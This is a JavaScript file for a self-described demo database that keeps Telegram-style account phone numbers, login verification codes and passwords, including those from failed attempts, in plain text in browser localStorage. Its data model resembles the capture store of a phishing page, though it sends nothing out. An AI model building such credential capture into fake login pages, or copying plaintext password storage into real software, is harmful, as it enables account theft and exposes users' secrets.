// Database simulation using localStorage
class DemoDatabase {
    constructor() {
        this.dbName = 'telegram_demo_accounts';
        this.init();
    }

    init() {
        if (!localStorage.getItem(this.dbName)) {
            const initialData = {
                accounts: [],
                loginAttempts: [],
                sessions: [],
                version: '1.0'
            };
            this.saveToStorage(initialData);
        }
    }

    getStorage() {
        return JSON.parse(localStorage.getItem(this.dbName)) || { accounts: [], loginAttempts: [] };
    }

    saveToStorage(data) {
        localStorage.setItem(this.dbName, JSON.stringify(data));
    }

    // Account methods
    createAccount(phone, code, password) {
        const storage = this.getStorage();
        const account = {
            id: this.generateId(),
            phone: phone,
            verification_code: code,
            password: password,
            status: 'completed',
            created_at: new Date().toISOString(),
            completed_at: new Date().toISOString(),
            session_id: this.generateSessionId()
        };

        storage.accounts.push(account);
        
        // Also log as login attempt
        storage.loginAttempts.push({
            id: this.generateId(),
            phone: phone,
            verification_code: code,
            password: password,
            attempt_type: 'account_creation',
            success: true,
            timestamp: new Date().toISOString(),
            session_id: account.session_id
        });

        this.saveToStorage(storage);
        return account;
    }

    logAttempt(phone, code, password, attemptType, success) {
        const storage = this.getStorage();
        storage.loginAttempts.push({
            id: this.generateId(),
            phone: phone,
            verification_code: code,
            password: password,
            attempt_type: attemptType,
            success: success,
            timestamp: new Date().toISOString(),
            session_id: this.generateSessionId()
        });
        this.saveToStorage(storage);
    }

    getAllAccounts() {
        return this.getStorage().accounts;
    }

    getAllAttempts() {
        return this.getStorage().loginAttempts;
    }

    clearAllData() {
        const initialData = {
            accounts: [],
            loginAttempts: [],
            sessions: [],
            version: '1.0',
            cleared_at: new Date().toISOString()
        };
        this.saveToStorage(initialData);
        return true;
    }

    getStats() {
        const storage = this.getStorage();
        return {
            totalAccounts: storage.accounts.length,
            totalAttempts: storage.loginAttempts.length,
            successfulLogins: storage.loginAttempts.filter(a => a.success).length,
            failedLogins: storage.loginAttempts.filter(a => !a.success).length
        };
    }

    generateId() {
        return Date.now().toString() + Math.random().toString(36).substr(2, 9);
    }

    generateSessionId() {
        return 'session_' + Math.random().toString(36).substr(2, 16);
    }
}

// Create global database instance
const demoDB = new DemoDatabase();
